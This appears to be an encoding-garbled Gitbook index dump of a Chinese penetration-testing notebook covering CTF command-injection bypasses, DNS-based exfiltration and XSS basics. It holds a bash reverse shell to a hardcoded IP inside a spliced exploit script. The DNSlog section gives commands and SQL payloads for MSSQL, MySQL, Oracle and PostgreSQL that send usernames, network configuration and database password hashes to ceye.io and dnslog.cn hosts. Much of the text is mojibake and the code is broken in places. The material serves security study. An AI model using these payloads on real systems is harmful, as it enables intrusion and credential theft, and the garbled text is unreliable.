ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºcpçš„æ–‡ä»¶ ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œcp /* .ï¼Œå°†æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶å¤åˆ¶åˆ°å½“å‰ç›®å½•ä¸‹ï¼Œç„¶åè®¿é—®/tmp/flagå³å¯ è§£æ³•2 >nl * /*>a ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºnlçš„æ–‡ä»¶ ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œnl /*>aï¼Œè¯»å–æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹é‡å®šå‘åˆ°aä¸­ï¼Œç„¶åè®¿é—®/tmp/aå³å¯ è§£æ³•3 è„šæœ¬ç›´æ¥å†™ğŸ æ— æ•°å­—ç»•è¿‡ å®‰æ´µæ¯2020[Web-Bash-Vino0o0o] åªèƒ½ç”¨${#}\\\\(è¿™å‡ ä¸ªå­—ç¬¦æ„é€ å‘½ä»¤ã€‚ çŸ¥è¯†ç‚¹ https://www.wolai.com/ctfhub/7oqQw5FrzCKj2us3ERp6Vg è§£æå…«è¿›åˆ¶ bash å¯ä»¥ç”¨ $'\\ooo' çš„å½¢å¼ä¾†è¡¨é”ä»»æ„å­—å…ƒï¼ˆooo æ˜¯å­—å…ƒè½‰ ascii çš„å…«é€²åˆ¶ï¼‰ â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ echo $'\\154'$'\\163' ls è¿›åˆ¶è½¬æ¢ $((xè¿›åˆ¶#æ•°å­—))ï¼šå°†xè¿›åˆ¶çš„æ•°å­—è½¬ä¸º10è¿›åˆ¶ â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ echo $((2#111)) 7 è·å–å­—ç¬¦ä¸²é•¿åº¦ â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ string=\"abcd\" echo ${#string} 4 $# ä¼ é€’ç»™è„šæœ¬å‚æ•°çš„ä¸ªæ•° $$ $$ ä»£è¡¨çš„æ˜¯ç›®å‰çš„ pid â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ echo $$ 21226 â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ ps PID TTY TIME CMD 21226 pts/0 00:00:05 zsh 41100 pts/0 00:00:00 ps â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ echo $(($# $0 ä¿å­˜è„šæœ¬å â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ echo $0 bash çš„ç”¨é€”æ˜¯å°‡ä»»æ„å­—ä¸²äº¤ç”±å‰é¢çš„æŒ‡ä»¤åŸ·è¡Œ æ€è·¯ï¼šå› ä¸ºshellèƒ½å¤Ÿè§£æè§£æå…«è¿›åˆ¶ï¼Œæ‰€ä»¥æ„é€ å‡º0~7æ•°å­—ï¼Œå°†å‘½ä»¤è½¬æ¢ä¸ºå…«è¿›åˆ¶ã€‚ exp import requests n = dict() n[0] = '0'#0 n[1] = '${##}'#1 n[2] = '$((${##}& /dev/tcp/120.77.73.212/2333 0>&1')) #ç›²æ³¨ #a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}@' # for i in range(1,50): # for j in a: # cmd=f'cat /flag|grep ^{f+j}&&sleep 3' # url = \"http://ip/\" # if get_flag(url,build(cmd)): # break # f = f+j # print(f) Win å¤šæ¡å‘½ä»¤æ‰§è¡Œ & ç”¨äºè¿æ¥å¤šä¸ªå‘½ä»¤ï¼ŒæŒ‰é¡ºåºæ‰§è¡Œ && ç”¨äºè¿æ¥å¤šä¸ªå‘½ä»¤ï¼Œåªæœ‰å‰ä¸€ä¸ªå‘½ä»¤æˆåŠŸæ‰§è¡Œåæ‰æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤ \\ ç”¨äºå°†ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºå¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ \\ \\ ç”¨äºè¿æ¥å¤šä¸ªå‘½ä»¤ï¼Œåªè¦å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œå°±æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤ ç»•è¿‡ç‰¹æ®Šå†…å®¹ ä¸€äº›æƒ…å†µä¸‹ï¼Œä¼šç¦æ­¢å‡ºç°ä¸€äº›æŒ‡å®šå†…å®¹ï¼Œå¦‚CTFæ—¶çš„flagå­—æ®µç­‰ï¼Œå¦‚æœä¸èƒ½ç”¨é€šé…ç¬¦ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•ä½¿ç”¨ç¼–ç æ–¹å¼æ¥ç»•è¿‡ powershell -command \"$decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Y2F0IC9mbGFnCg==')); Invoke-Expression $decodedCommand\" ä¹Ÿå¯ä»¥ä½¿ç”¨é˜²è½¬ä¹‰çš„æ–¹å¼æ¥ç»•è¿‡ type test.t^x^t è¿˜å¯ä»¥ä½¿ç”¨æ‹¼æ¥çš„æ–¹å¼ç»•è¿‡ type t\"es\"t.tx\"\"t è¿˜å¯ä»¥ä½¿ç”¨èµ‹å€¼å˜é‡çš„æ–¹å¼æ¥ç»•è¿‡ set a=type&&set b=test.txt&&%a% %b% å¦‚æœç¦æ­¢äº†%\\w%ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ç”¨åˆ‡å‰²çš„æ–¹å¼æ¥ç»•è¿‡ set a=type&&set b=test.txt&&%a:~0% %b% ç»•è¿‡ç©ºæ ¼ ä¸€äº›æƒ…å†µä¸‹ï¼Œä¼šç¦æ­¢åœ¨å‘½ä»¤ä¸­ä½¿ç”¨ç©ºæ ¼ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨å¦‚ä¸‹å‡ ç§æ–¹å¼æ¥ç»•è¿‡ type.\\test.txt type,test.txt Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 22:23:20 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/03.å‘½ä»¤æ³¨å…¥/03.Dnslog.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/03.å‘½ä»¤æ³¨å…¥/03.Dnslog.html","title":"03.Dnslog","keywords":"","body":"Windows ping %USERNAME%.xxxxx.ceye.io cmd /v /c \"hostname > temp && certutil -encode temp temp2 && findstr /L /V \"CERTIFICATE\" temp2 > temp3 && set /p MYVAR= test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.xxxxx.ceye.io';$j += 1; nslookup $fin } Linux ping `whoami`.xxxxx.ceye.io curl `id -un`.xxx.dnslog.cn curl `pwd|od -A n -t x1|sed 's/ //g'`.xxx.dnslog.cn curl $(find /xxx/xx/xx -type d -writable |od -A n -t x1|sed 's/ //g'|sed -r 's/$/.mp3smh.dnslog.cn/g') # æŸ¥æ‰¾å¯å†™ç›®å½• var=11111 && for b in $(ifconfig|xxd -p ); do var=$((var+1)) && dig $var.$b.xxxxx.ceye.io; done var=11111 && for i in $(ifconfig|base64|awk '{gsub(/.{50}/,\"&\\n\")}1'); do var=$((var+1)) && nslookup $var.$i.xxxxx.ceye.io; done mssql DECLARE @host varchar(1024); SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa') +'.ip.port..ceye.io'; EXEC('master..xp_dirtree \"\\\\'+@host+'\\foobar$\"'); mysql SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port..ceye.io\\\\abc')); Oracle SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port..ceye.io'); SELECT UTL_HTTP.REQUEST('http://ip.port..ceye.io/oracle') FROM DUAL; SELECT HTTPURITYPE('http://ip.port..ceye.io/oracle').GETCLOB() FROM DUAL; SELECT DBMS_LDAP.INIT(('oracle.ip.port..ceye.io',80) FROM DUAL; SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port..ceye.io',80) FROM DUAL; PostgreSQL DROP TABLE IF EXISTS table_output; CREATE TABLE table_output(content text); CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $ DECLARE exec_cmd TEXT; DECLARE query_result TEXT; BEGIN SELECT INTO query_result (SELECT passwd FROM pg_shadow WHERE usename='postgres'); exec_cmd := E'COPY table_output(content) FROM E\\'\\\\\\\\\\\\\\\\'||query_result||E'.psql.ip.port..ceye.io\\\\\\\\foobar.txt\\''; EXECUTE exec_cmd; END; $ LANGUAGE plpgsql SECURITY DEFINER; SELECT temp_function(); Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 15:35:34 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/04.è·¨ç«™è„šæœ¬æ”»å‡»/01.å‰ç½®çŸ¥è¯†.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/04.è·¨ç«™è„šæœ¬æ”»å‡»/01.å‰ç½®çŸ¥è¯†.html","title":"01.å‰ç½®çŸ¥è¯†","keywords":"","body":"æµè§ˆå™¨ä»€ä¹ˆæ—¶å€™ä¼šå°†å“åº”å†…å®¹å½“æˆ HTML æ–‡æ¡£æ¥è§£æ å½“å“åº”çš„ Content-Typeä¸ºä»¥ä¸‹æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šå°†å“åº”å†…å®¹å½“æˆ HTML æ–‡æ¡£æ¥è§£æï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆçº¯APIæ¥å£ç½‘ç«™ä¸å­˜åœ¨XSSæ¼æ´çš„åŸå› ï¼ˆContent-Typeä¸ºapplication/jsonï¼‰ text/html application/xhtml+xml application/xml text/xml image/svg+xml å¦‚ä½•æ‰§è¡Œjavascript scriptæ ‡ç­¾ alert(1) éscriptæ ‡ç­¾ äº‹ä»¶è§¦å‘ HTML DOM äº‹ä»¶å¯¹è±¡ | èœé¸Ÿæ•™ç¨‹ javascript: ä¼ªåè®® //IE7ä»¥ä¸‹ scriptæ ‡ç­¾çš„srcå±æ€§ï¼Œå¼•å…¥å¤–æ¥jsæ–‡ä»¶ è¯·æ±‚ç½‘é¡µè§£ç æµç¨‹ HTML ç¼–ç /è§£ç  å½“æµè§ˆå™¨æ¥æ”¶åˆ°æœåŠ¡ç«¯å‘é€æ¥çš„äºŒè¿›åˆ¶æ•°æ®åï¼Œé¦–å…ˆä¼šå¯¹å…¶è¿›è¡ŒHTMLè§£ç ï¼Œå‘ˆç°å‡ºæ¥çš„å°±æ˜¯æˆ‘ä»¬çœ‹åˆ°çš„æºä»£ç ã€‚å…·ä½“çš„è§£ç æ–¹å¼ä¾å…·ä½“æƒ…å†µè€Œå®šï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨é¡µé¢ä¸­æŒ‡å®šç¼–ç ï¼Œé˜²æ­¢æµè§ˆå™¨æŒ‰ç…§é”™è¯¯çš„æ–¹å¼è§£ç ï¼Œé€ æˆä¹±ç ã€‚ ä½†æ˜¯åœ¨HTMLä¸­æœ‰äº›å­—ç¬¦æ˜¯å’Œå…³é”®è¯å†²çªçš„ï¼Œæ¯”å¦‚ ã€>ã€&ï¼Œè§£ç ä¹‹åï¼Œæµè§ˆå™¨ä¼šè¯¯è®¤ä¸ºå®ƒä»¬æ˜¯HTMLæ ‡ç­¾ï¼Œå¦‚æœå¸Œæœ›æ­£ç¡®åœ°æ˜¾ç¤ºé¢„ç•™å­—ç¬¦ï¼Œå°±éœ€è¦åœ¨HTMLä¸­ä½¿ç”¨å¯¹åº”çš„HTMLå­—ç¬¦å®ä½“ã€‚ å­—ç¬¦å®ä½“æ˜¯ä¸€ä¸ªè½¬ä¹‰åºåˆ—ï¼Œå®ƒå®šä¹‰äº†ä¸€èˆ¬æ— æ³•åœ¨æ–‡æœ¬å†…å®¹ä¸­è¾“å…¥çš„å•ä¸ªå­—ç¬¦æˆ–ç¬¦å·ã€‚ä¸€ä¸ªå­—ç¬¦å®ä½“ä»¥ä¸€ä¸ª&ç¬¦å·å¼€å¤´ï¼Œåé¢è·Ÿç€ä¸€ä¸ªé¢„å®šä¹‰çš„å®ä½“çš„åç§°ï¼Œæˆ–ç”¨&#å¼€å¤´+å®ä½“ç¼–å·+åˆ†å·æ¥è¡¨ç¤ºã€‚ å¸¸è§çš„HTMLå­—ç¬¦å®ä½“æœ‰ï¼š æ˜¾ç¤ºç»“æœ æè¿° å®ä½“åç§° å®ä½“ç¼–å· ç©ºæ ¼ å°äºå· > å¤§äºå· > > & å’Œå· & & \" å¼•å· \" \" ' æ’‡å· '(IEä¸æ”¯æŒ) ' ä½†å¹¶ä¸æ˜¯æ‰€æœ‰çš„å­—ç¬¦éƒ½æœ‰å®ä½“åç§°ï¼Œä½†æ˜¯å®ƒä»¬éƒ½æœ‰è‡ªå·±çš„å®ä½“ç¼–å·ã€‚ ä¸€ä¸ªHTMLè§£æå™¨ä½œä¸ºä¸€ä¸ªçŠ¶æ€æœºï¼Œå®ƒä»è¾“å…¥æµä¸­è·å–å­—ç¬¦å¹¶æŒ‰ç…§è½¬æ¢è§„åˆ™è½¬æ¢åˆ°å¦ä¸€ç§çŠ¶æ€ã€‚åœ¨è§£æè¿‡ç¨‹ä¸­ï¼Œä»»ä½•æ—¶å€™å®ƒåªè¦é‡åˆ°ä¸€ä¸ª ç¬¦å·ï¼ˆåé¢æ²¡æœ‰è·Ÿ /ç¬¦å·ï¼‰å°±ä¼šè¿›å…¥ æ ‡ç­¾å¼€å§‹çŠ¶æ€(Tag open state) ï¼Œç„¶åè½¬å˜åˆ° æ ‡ç­¾åçŠ¶æ€(Tag name state) ã€ å‰å±æ€§åçŠ¶æ€(before attribute name state) ......æœ€åè¿›å…¥ æ•°æ®çŠ¶æ€(Data state) å¹¶é‡Šæ”¾å½“å‰æ ‡ç­¾çš„tokenã€‚å½“è§£æå™¨å¤„äº æ•°æ®çŠ¶æ€(Data state) æ—¶ï¼Œå®ƒä¼šç»§ç»­è§£æï¼Œæ¯å½“å‘ç°ä¸€ä¸ªå®Œæ•´çš„æ ‡ç­¾ï¼Œå°±ä¼šé‡Šæ”¾å‡ºä¸€ä¸ªtokenã€‚ ç®€å•çš„è¯´å°±æ˜¯ï¼Œæµè§ˆå™¨å¯¹HTMLè§£ç ä¹‹åå°±å¼€å§‹è§£æHTMLæ–‡æ¡£ï¼Œå°†ä¼—å¤šæ ‡ç­¾è½¬åŒ–ä¸ºå†…å®¹æ ‘ä¸­çš„DOMèŠ‚ç‚¹ï¼Œæ­¤æ—¶è¯†åˆ«æ ‡ç­¾çš„æ—¶å€™ï¼ŒHTMLè§£æå™¨æ˜¯æ— æ³•è¯†åˆ«é‚£äº›è¢«å®ä½“ç¼–ç çš„å†…å®¹çš„ï¼Œåªæœ‰å»ºç«‹èµ·DOMæ ‘ï¼Œæ‰èƒ½å¯¹æ¯ä¸ªèŠ‚ç‚¹çš„å†…å®¹è¿›è¡Œè¯†åˆ«ï¼Œå¦‚æœå‡ºç°å®ä½“ç¼–ç ï¼Œåˆ™ä¼šè¿›è¡Œå®ä½“è§£ç ï¼Œåªè¦æ˜¯DOMèŠ‚ç‚¹é‡Œå±æ€§çš„å€¼ï¼Œéƒ½å¯ä»¥è¢«HTMLç¼–ç å’Œè§£æã€‚ æ‰€ä»¥åœ¨PHPä¸­ï¼Œä½¿ç”¨htmlspecialchars()å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ï¼Œåªæœ‰ç­‰åˆ°DOMæ ‘å»ºç«‹èµ·æ¥åï¼Œæ‰ä¼šè§£æHTMLå®ä½“ï¼Œèµ·åˆ°äº†XSSé˜²æŠ¤ä½œç”¨ã€‚ URL è§£ç  URLç¼–ç æ˜¯ä¸ºäº†å…è®¸URLä¸­å­˜åœ¨æ±‰å­—è¿™æ ·çš„éæ ‡å‡†å­—ç¬¦ï¼Œæœ¬è´¨æ˜¯æŠŠä¸€ä¸ªå­—ç¬¦è½¬ä¸º%åŠ ä¸ŠUTF-8ç¼–ç å¯¹åº”çš„16è¿›åˆ¶æ•°å­—ã€‚æ‰€ä»¥åˆç§°ä¹‹ä¸ºPercent-encodingã€‚ åœ¨æœåŠ¡ç«¯æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šè‡ªåŠ¨å¯¹è¯·æ±‚è¿›è¡Œä¸€æ¬¡URLè§£ç ã€‚ JavaScript è§£ç ï¼ˆåªæ”¯æŒUnicodeï¼‰ å½“HTMLè§£æäº§ç”ŸDOMèŠ‚ç‚¹åï¼Œä¼šæ ¹æ®DOMèŠ‚ç‚¹æ¥åšæ¥ä¸‹æ¥çš„è§£æå·¥ä½œï¼Œæ¯”å¦‚åœ¨å¤„ç†è¯¸å¦‚ ã€ è¿™æ ·çš„æ ‡ç­¾æ—¶ï¼Œè§£æå™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°JavaScriptè§£ææ¨¡å¼ï¼Œè€Œ srcã€ href åè¾¹åŠ å…¥çš„ javascript ä¼ªURLï¼Œä¹Ÿä¼šè¿›å…¥ JavaScript çš„è§£ææ¨¡å¼ã€‚ æ¯”å¦‚ testï¼ŒJavaScript å‡ºå‘äº† JavaScript è§£é‡Šå™¨ï¼ŒJavaScript ä¼šå…ˆå¯¹å†…å®¹è¿›è¡Œè§£æï¼Œé‡Œè¾¹æœ‰ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦\\u0031ï¼Œå‰å¯¼çš„ u è¡¨ç¤ºä»–æ˜¯ä¸€ä¸ªunicode å­—ç¬¦ï¼Œæ ¹æ®åè¾¹çš„æ•°å­—ï¼Œè§£æä¸ºâ€œ1â€ï¼Œäºæ˜¯åœ¨å®Œæˆ JavaScript çš„è§£æä¹‹åå˜æˆäº† testã€‚ ä¸‹é¢ç”¨ä¸€ä¸ªæ™®é€šçš„XSSä»£ç æ¥è¯´æ˜ä¸€ä¸‹æµè§ˆå™¨å¯¹å…¶è§£æçš„è¿‡ç¨‹ã€‚ test é¦–å…ˆHTMLè§£æå™¨å¼€å§‹å·¥ä½œï¼Œå¹¶å¯¹hrefä¸­çš„å­—ç¬¦åšHTMLè§£ç ï¼Œæ¥ä¸‹æ¥URLè§£æå™¨å¯¹hrefå€¼è¿›è¡Œè§£ç ï¼Œæ­£å¸¸æƒ…å†µä¸‹URLå€¼ä¸ºä¸€ä¸ªæ­£å¸¸çš„URLé“¾æ¥ï¼Œå¦‚ï¼šhttps://www.baidu.comï¼Œé‚£ä¹ˆURLè§£æå™¨å·¥ä½œå®Œæˆåæ˜¯ä¸éœ€è¦å…¶ä»–è§£ç çš„ï¼Œä½†æ˜¯è¯¥ç¯å¢ƒä¸­URLèµ„æºç±»å‹ä¸ºJavascriptï¼Œå› æ­¤è¯¥ç¯å¢ƒä¸­æœ€åä¸€æ­¥Javascriptè§£æå™¨è¿˜ä¼šè¿›è¡Œè§£ç æ“ä½œï¼Œæœ€åè§£æçš„è„šæœ¬å°†è¢«æ‰§è¡Œã€‚ æ•´ä¸ªè§£æé¡ºåºä¸º3ä¸ªç¯èŠ‚ï¼šHTMLè§£ç  â€”>URLè§£ç  â€”>JSè§£ç  æˆ‘ä»¬å¯ä»¥å¯¹XSSæ”»å‡»å‘é‡åšè¿™ä¸‰ç§ç¼–ç éƒ½å¯ä»¥æˆåŠŸå¼¹æ¡†ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-25 22:28:37 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/04.è·¨ç«™è„šæœ¬æ”»å‡»/02.æ¼æ´äº†è§£.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/04.è·¨ç«™è„šæœ¬æ”»å‡»/02.æ¼æ´äº†è§£.html","title":"02.æ¼æ´äº†è§£","keywords":"","body":"æ¼æ´åŸç† è·¨ç«™è„šæœ¬ï¼ˆè‹±è¯­ï¼šCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºï¼šXSSï¼‰æ˜¯ä¸€ç§ç½‘ç«™åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´æ”»å‡»ã€‚è¿™ç±»æ¼æ´å…è®¸æ”»å‡»è€…å°†æ¶æ„ä»£ç æ³¨å…¥åˆ°å‰ç«¯ç½‘é¡µä¸Šï¼Œå…¶ä»–ç”¨æˆ·åœ¨æµè§ˆç½‘é¡µæ—¶å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç è€Œå—åˆ°å½±å“ã€‚ æœ¬è´¨æ˜¯å®¢æˆ·ç«¯æ¼æ´ï¼Œå½“æµè§ˆå™¨å°†å“åº”å†…å®¹å½“æˆ HTML æ–‡æ¡£æ¥è§£ææ—¶è§¦å‘æ¶æ„jsä»£ç å®Œæˆæ”»å‡» æ¼æ´å±å®³ å®é™…ä¸Šå°±æ˜¯JSä»£ç æ‰§è¡Œï¼Œæ‰€ä»¥jsèƒ½åšçš„å°±èƒ½åš çªƒå–ç”¨æˆ·çš„ä¼šè¯ä»¤ç‰Œæˆ–Cookieï¼Œå¹¶ä»¥ç”¨æˆ·çš„èº«ä»½è¿›è¡Œéæ³•æ“ä½œ æœªæˆæƒæ“ä½œï¼Œé€šè¿‡JSå‘èµ·æ•æ„Ÿæ“ä½œè¯·æ±‚ æŒ‰é”®è®°å½•å’Œé’“é±¼ xssè •è™«ä¼ æ’­ï¼Œå€ŸåŠ©ç½‘ç«™è¿›è¡Œä¼ æ’­ï¼Œä½¿ç½‘ç«™çš„ä½¿ç”¨ç”¨æˆ·å—åˆ°æ”»å‡»ã€‚ åŠ«æŒç”¨æˆ·ä¼šè¯ï¼Œä»è€ŒçŸ¥æ‚‰ä»»æ„æ“ä½œï¼Œæ¯”å¦‚å¼¹çª—è·³è½¬ã€ç¯¡æ”¹é¡µé¢ã€ç½‘é¡µæŒ‚é©¬ã€‚ æ¼æ´åˆ†ç±» åå°„å‹ ç”¨æˆ·è¾“å…¥ä»€ä¹ˆç½‘ç«™è¿”å›ä»€ä¹ˆï¼Œæ¼æ´æˆå‹ç‚¹åœ¨æœåŠ¡å™¨ç«¯ä»£ç è§£æå¼•æ“ if( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) { // ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°htmlä¸­ $html .= 'Hello ' . $_GET[ 'name' ] . ''; } å¸¸è§åœºæ™¯ï¼šå°†ç”¨æˆ·è¾“å…¥è¿›è¡Œå›æ˜¾çš„åœ°æ–¹ï¼Œæ”»å‡»è€…é€šå¸¸è¦å°†æ„é€ å¥½çš„urlå‘é€ç»™å—å®³è€…ï¼Œå—å®³è€…ç‚¹å‡»ä¹‹åæ‰ä¼šè§¦å‘ã€‚ æ¯”å¦‚æŸç«™ç‚¹æœç´¢åŠŸèƒ½å¤„å­˜åœ¨åå°„xssï¼Œæ”»å‡»è€…æ„é€  https://test.com/search.php?key= å½“ç”¨æˆ·ç‚¹å‡»è¯¥é“¾æ¥å°±ä¼šå‘ç”Ÿå¼¹çª— å­˜å‚¨å‹ ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šå…ˆå­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œåªè¦æŸ¥è¯¢åˆ°æ•°æ®åº“ä¸­çš„è„æ•°æ®ï¼Œè¿™äº›æ•°æ®å›æ˜¾åˆ°é¡µé¢å°±ä¼šè§¦å‘XSSï¼Œæ¼æ´æˆå‹ç‚¹åœ¨æ•°æ®åº“ if( isset( $_POST[ 'btnSign' ] ) ) { // è·å–ç”¨æˆ·è¾“å…¥ $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // é˜²å¾¡sqlæ³¨å…¥ï¼ˆä¹Ÿä¸å…¨ï¼Œ$nameå˜é‡æ²¡æœ‰è¿‡æ»¤ï¼‰ $message = mysqli_real_escape_string( $message ); // æ²¡æœ‰è€ƒè™‘åˆ°å¯¹ XSS è¿›è¡Œè¿‡æ»¤,å°†xssæ•°æ®å­˜å…¥æ•°æ®åº“ä¸­ $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; // æŸ¥è¯¢ï¼Œæ‹¼æ¥ï¼Œè§¦å‘xss xxxxï¼› } å¸¸è§åœºæ™¯ï¼šè¯„è®ºï¼Œè®¢å•ï¼Œä¸ªäººä¿¡æ¯ä¿®æ”¹ï¼ˆå¯ä»¥å‚è€ƒsqlä¸­çš„äºŒæ¬¡æ³¨å…¥ï¼‰ DOMå‹ ä¸æœåŠ¡å™¨æ— äº¤äº’ï¼Œæ¼æ´æˆå‹ç‚¹åœ¨javascriptæ–‡ä»¶è§£æç”¨æˆ·è¾“å…¥æ—¶ï¼Œè§¦å‘ç‚¹åœ¨å®¢æˆ·ç«¯æ¸²æŸ“DOMæ—¶ã€‚ # lang å˜é‡é€šè¿‡ document.location.hrefï¼ˆå½“å‰é¡µé¢çš„ URLï¼‰æ¥è·å– var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8); # å¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤å°±ç›´æ¥ URL è§£ç åè¾“å‡ºåœ¨äº† option æ ‡ç­¾ä¸­ document.write(\"\" + $decodeURI(lang) + \"\"); å¸¸è§åœºæ™¯ï¼šéœ€è¦å®¡è®¡javascriptä»£ç ğŸ˜ª å¸¸è§åœºæ™¯ é‡ç¾åŒºï¼šè¯„è®ºåŒºã€ç•™è¨€åŒºã€ä¸ªäººä¿¡æ¯ã€è®¢å•ä¿¡æ¯ç­‰ é’ˆå¯¹å‹ï¼šç«™å†…ä¿¡ã€ç½‘é¡µå³æ—¶é€šè®¯ã€ç§ä¿¡ã€æ„è§åé¦ˆ å­˜åœ¨é£é™©ï¼šæœç´¢æ¡†ã€å½“å‰ç›®å½•ã€å›¾ç‰‡å±æ€§ã€è‡ªå®šä¹‰å¤´åƒé“¾æ¥ï¼Œä¸Šä¼ æ–‡ä»¶å POC 123 \" nmask æ¼æ´ä¿®å¤ CSP https://xz.aliyun.com/t/12370#toc-25 CSPæŒ‡çš„æ˜¯Content Security Policyï¼Œå³å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆç™½åå•ï¼‰ã€‚å®ƒæ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºä¿æŠ¤ç½‘ç«™å…å—è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSæ”»å‡»ï¼‰ã€æ•°æ®ç›—å–ç­‰Webæ”»å‡»çš„å½±å“ã€‚ CSPæŒ‡ä»¤å¯ä»¥åœ¨HTTPå“åº”å¤´ä¸­è®¾ç½®ï¼Œä¹Ÿå¯ä»¥åœ¨HTMLæ–‡æ¡£ä¸­ä½¿ç”¨metaæ ‡ç­¾è®¾ç½®ã€‚ é€šè¿‡CSPï¼Œç½‘ç«™ç®¡ç†å‘˜å¯ä»¥å‘Šè¯‰æµè§ˆå™¨å“ªäº›èµ„æºå¯ä»¥åŠ è½½åˆ°é¡µé¢ä¸­ï¼Œä¾‹å¦‚å¯ä»¥ä¿¡ä»»å“ªäº›æ¥æºçš„JavaScriptã€CSSã€å›¾ç‰‡ç­‰èµ„æºã€‚è¿™æ ·ï¼Œæµè§ˆå™¨å°±åªä¼šåŠ è½½æ¥è‡ªè¿™äº›å—ä¿¡ä»»æ¥æºçš„èµ„æºï¼Œä»è€Œå‡å°‘äº†è¢«æ¶æ„è„šæœ¬æ”»å‡»çš„é£é™©ã€‚ è¾“å‡ºç¼–ç  é»‘åå• æ›´å¤šå‚è€ƒhttps://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/02.XSS/#%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81 Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 15:40:38 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/04.è·¨ç«™è„šæœ¬æ”»å‡»/03.æ¼æ´åˆ©ç”¨.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/04.è·¨ç«™è„šæœ¬æ”»å‡»/03.æ¼æ´åˆ©ç”¨.html","title":"03.æ¼æ´åˆ©ç”¨","keywords":"","body":"æµ‹è¯•æµç¨‹ 01.F12æŸ¥çœ‹æ•°æ®è¾“å‡ºç‚¹é€‰æ‹©é—­åˆæ–¹å¼ è¾“å‡ºåœ¨å±æ€§é‡Œ ä¾‹å¦‚è¾“å‡ºçš„ä½ç½®ä½äºvalueå±æ€§ä¸­ï¼š 